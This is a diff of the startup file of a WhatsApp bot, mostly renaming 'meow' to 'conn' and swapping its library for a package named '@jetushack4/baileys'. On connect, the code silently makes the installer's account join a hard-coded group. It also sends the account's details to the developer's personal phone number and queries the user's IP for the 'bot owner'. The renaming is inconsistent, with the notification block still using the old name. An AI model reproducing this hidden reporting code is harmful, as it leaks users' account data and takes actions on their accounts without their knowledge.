@@ -2,7 +2,7 @@ require('./config.js')
 const {
  master,
  MessageType
- } = require('olduser/alok')
+ } = require('@jetushack4/baileys')
  const {
  WAConnection: _WAConnection,
  MessageType2
@@ -66,13 +66,13 @@ if (opts['big-qr']) conn.on('qr', qr => generate(qr, { small: false }))
     teks = `https://chat.whatsapp.com/IHP6JLwAIi4HeVJMDJPw1N`
     meow.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
-        //inform to developer that the user is meowected to bot
+        //inform to developer that the user is connected to bot
         
-      meow.sendMessage(`918602239106@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot meowected Successfully!_`, MessageType.extendedText)
+      meow.sendMessage(`918602239106@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot connected Successfully!_`, MessageType.extendedText)
          
        meow.sendMessage(`918602239106@s.whatsapp.net`, `Thanks bro, your Olduser Tokio Bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
-     meow.sendMessage(`918602239106@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully meowected to this number*\n────────────────────\n\`\`\`${JSON.stringify(meow.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
+     meow.sendMessage(`918602239106@s.whatsapp.net`, `*Hi Owner olduser, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(meow.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer olduser Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./olduser.jpg'),sourceUrl:"https://wa.me/918602239106?text=Hello bro"}}})
      
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
@@ -85,20 +85,20 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 if (!opts['test']) setInterval(async () => {
   await global.db.write()
 }, 60 * 1000) // Save every minute
-if (opts['server']) require('./server')(global.meow, PORT)
+if (opts['server']) require('./server')(global.conn, PORT)
 
-meow.user = {
+conn.user = {
   jid: '',
   name: '',
   phone: {}
 }
 if (opts['test']) {
-  meow.user = {
+  conn.user = {
     jid: '2219191@s.whatsapp.net',
     name: 'test',
     phone: {}
   }
-  meow.prepareMessageMedia = (buffer, mediaType, options = {}) => {
+  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
     return {
       [mediaType]: {
         url: '',
@@ -116,12 +116,12 @@ if (opts['test']) {
     }
   }
 
-  meow.sendMessage = async (chatId, content, type, opts = {}) => {
-    let message = await meow.prepareMessageContent(content, type, opts)
-    let waMessage = await meow.prepareMessageFromContent(chatId, message, opts)
+  conn.sendMessage = async (chatId, content, type, opts = {}) => {
+    let message = await conn.prepareMessageContent(content, type, opts)
+    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
     if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
-    meow.emit('chat-update', {
-      jid: meow.user.jid,
+    conn.emit('chat-update', {
+      jid: conn.user.jid,
       hasNewMessage: true,
       count: 1,
       messages: {
@@ -131,12 +131,12 @@ if (opts['test']) {
       }
     })
   }
-  rl.on('line', line => meow.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
+  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
 } else {
   rl.on('line', line => {
     process.send(line.trim())
   })
-  meow.meowect().then(async () => {
+  conn.connect().then(async () => {
   await global.db.read()
   global.db.data = {
     users: {},
@@ -147,8 +147,8 @@ if (opts['test']) {
     ...(global.db.data || {})
   }
   global.db.chain = _.chain(global.db.data)
-    fs.writeFileSync(authFile, JSON.stringify(meow.base64EncodedAuthInfo(), null, '\t'))
-    global.timestamp.meowect = new Date
+    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
+    global.timestamp.connect = new Date
   })
 }
 process.on('uncaughtException', console.error)
@@ -157,36 +157,36 @@ let isInit = true
 global.reloadHandler = function () {
   let handler = require('./handler')
   if (!isInit) {
-    meow.off('chat-update', meow.handler)
-    meow.off('message-delete', meow.onDelete)
-    meow.off('group-participants-update', meow.onParticipantsUpdate)
-    meow.off('CB:action,,call', meow.onCall)
+    conn.off('chat-update', conn.handler)
+    conn.off('message-delete', conn.onDelete)
+    conn.off('group-participants-update', conn.onParticipantsUpdate)
+    conn.off('CB:action,,call', conn.onCall)
   }
-  meow.welcome = 'Hi @user 👋🏻\nWelcome to the group @subject\n\n@desc'
-  meow.bye = 'Goodbye @user 👋🏻'
-  meow.spromote = '@user is now admin!'
-  meow.sdemote = '@user is not admin now!'
-  meow.handler = handler.handler
-  meow.onDelete = handler.delete
-  meow.onParticipantsUpdate = handler.participantsUpdate
-  meow.onCall = handler.onCall
-  meow.on('chat-update', meow.handler)
-  meow.on('message-delete', meow.onDelete)
-  meow.on('group-participants-update', meow.onParticipantsUpdate)
-  meow.on('CB:action,,call', meow.onCall)
+  conn.welcome = 'Hi @user 👋🏻\nWelcome to the group @subject\n\n@desc'
+  conn.bye = 'Goodbye @user 👋🏻'
+  conn.spromote = '@user is now admin!'
+  conn.sdemote = '@user is not admin now!'
+  conn.handler = handler.handler
+  conn.onDelete = handler.delete
+  conn.onParticipantsUpdate = handler.participantsUpdate
+  conn.onCall = handler.onCall
+  conn.on('chat-update', conn.handler)
+  conn.on('message-delete', conn.onDelete)
+  conn.on('group-participants-update', conn.onParticipantsUpdate)
+  conn.on('CB:action,,call', conn.onCall)
   if (isInit) {
-    meow.on('error', meow.logger.error)
-    meow.on('close', () => {
+    conn.on('error', conn.logger.error)
+    conn.on('close', () => {
       setTimeout(async () => {
         try {
-          if (meow.state === 'close') {
-            if (fs.existsSync(authFile)) await meow.loadAuthInfo(authFile)
-            await meow.meowect()
-            fs.writeFileSync(authFile, JSON.stringify(meow.base64EncodedAuthInfo(), null, '\t'))
-            global.timestamp.meowect = new Date
+          if (conn.state === 'close') {
+            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
+            await conn.connect()
+            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
+            global.timestamp.connect = new Date
           }
         } catch (e) {
-          meow.logger.error(e)
+          conn.logger.error(e)
         }
       }, 5000)
     })
@@ -203,7 +203,7 @@ for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
   try {
     global.plugins[filename] = require(path.join(pluginFolder, filename))
   } catch (e) {
-    meow.logger.error(e)
+    conn.logger.error(e)
     delete global.plugins[filename]
   }
 }
@@ -213,18 +213,18 @@ global.reload = (_event, filename) => {
     let dir = path.join(pluginFolder, filename)
     if (dir in require.cache) {
       delete require.cache[dir]
-      if (fs.existsSync(dir)) meow.logger.info(`re - require plugin '${filename}'`)
+      if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
       else {
-        meow.logger.warn(`deleted plugin '${filename}'`)
+        conn.logger.warn(`deleted plugin '${filename}'`)
         return delete global.plugins[filename]
       }
-    } else meow.logger.info(`requiring new plugin '${filename}'`)
+    } else conn.logger.info(`requiring new plugin '${filename}'`)
     let err = syntaxerror(fs.readFileSync(dir), filename)
-    if (err) meow.logger.error(`syntax error while loading '${filename}'\n${err}`)
+    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
     else try {
       global.plugins[filename] = require(dir)
     } catch (e) {
-      meow.logger.error(e)
+      conn.logger.error(e)
     } finally {
       global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
     }
@@ -270,11 +270,11 @@ async function _quickTest() {
   require('./lib/sticker').support = s
   Object.freeze(global.support)
 
-  if (!s.ffmpeg) meow.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
-  if (s.ffmpeg && !s.ffmpegWebp) meow.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
-  if (!s.convert && !s.magick && !s.gm) meow.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
+  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
+  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
+  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
 }
 
 _quickTest()
-  .then(() => meow.logger.info('Quick Test Done'))
+  .then(() => conn.logger.info('Quick Test Done'))
   .catch(console.error)
